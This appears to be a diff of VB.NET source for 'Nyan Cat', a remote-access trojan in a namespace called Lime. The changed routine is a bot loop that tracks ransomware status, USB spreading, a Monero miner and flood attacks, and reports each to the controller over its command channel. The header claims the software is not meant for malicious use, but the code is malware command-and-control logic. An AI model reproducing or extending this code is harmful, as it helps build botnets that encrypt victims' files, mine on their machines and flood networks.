@@ -1,5 +1,5 @@
 ﻿'##################################################################
-'##         N Y A N   C A T  |||   Updated on Aug/20/2018        ##
+'##        N Y A N   C A T  |||   Updated on Sept/09/2018        ##
 '##################################################################
 '##                                                              ##
 '##                                                              ##
@@ -30,6 +30,7 @@
 '##  This software's main purpose is NOT to be used maliciously  ##
 '##################################################################
 '## I am not responsible For any actions caused by this software ##
+'##################################################################
 '##################################################################
 
 Namespace Lime
@@ -108,49 +109,61 @@ Namespace Lime
         Declare Sub IdleTimerReset Lib "coredll.dll" Alias "SystemIdleTimerReset" ()
         Private Shared Sub Checking()
             Threading.Thread.CurrentThread.Sleep(5000)
-            Dim OldRans As String = GTV("Rans-Status")
-            Dim OldUSB As String = GTV("USB")
-            Dim OldXMR As String = GTV("XMR")
-            Dim OldFLD As String = GTV("Flood")
+
+            Dim OldRans As String = C_ID.Rans
+            Dim OldUSB As String = C_ID.USBSP
+            Dim OldXMR As String = C_ID.XMR
+            Dim OldFLD As String = C_ID.Flood
             C_Nosleep.No_Sleep()
 
             While True
-                Try
+
 1:
                     If C.CNT = True Then
                         Threading.Thread.CurrentThread.Sleep(3000)
                         'Compare old string with new string            
-                        If OldRans <> GTV("Rans-Status").ToString Then
+
+                        Try
+                        If OldRans <> GTV("Rans-Status") Then
                             OldRans = GTV("Rans-Status")
                             C.Send("!R" & SPL & OldRans)
                         End If
+                    Catch ex As Exception
 
-                        If C_Settings.USB Then
-                            If OldUSB <> GTV("USB").ToString Then
-                                OldUSB = GTV("USB")
-                                C.Send("!SP" & SPL & OldUSB)
+                        End Try
+
+                        Try
+                            If C_Settings.USB Then
+                                If OldUSB <> GTV("USB").ToString Then
+                                    OldUSB = GTV("USB")
+                                    C.Send("!SP" & SPL & OldUSB)
+                                End If
                             End If
-                        End If
+                        Catch ex As Exception
+                        End Try
 
+                        Try
                         If OldXMR <> C_ID.XMR Then
-                            STV("XMR", C_ID.XMR.ToString)
                             OldXMR = GTV("XMR")
                             C.Send("!X" & SPL & OldXMR)
                         End If
+                    Catch ex As Exception
+                        End Try
 
-                        If OldFLD <> GTV("Flood").ToString Then
-                            OldFLD = GTV("Flood")
-                            C.Send("MSG" & SPL & "Flood! " & OldFLD)
-                            OldFLD = ""
-                            STV("Flood", "")
-                        End If
+                        Try
+                            If OldFLD <> GTV("Flood").ToString Then
+                                OldFLD = GTV("Flood")
+                                C.Send("MSG" & SPL & "Flood! " & OldFLD)
+                                OldFLD = ""
+                                STV("Flood", "")
+                            End If
+                        Catch ex As Exception
+                        End Try
 
                     Else
                         Threading.Thread.CurrentThread.Sleep(5000)
                     End If
-                Catch ex As Exception
-                    GoTo 1
-                End Try
+
             End While
 
         End Sub
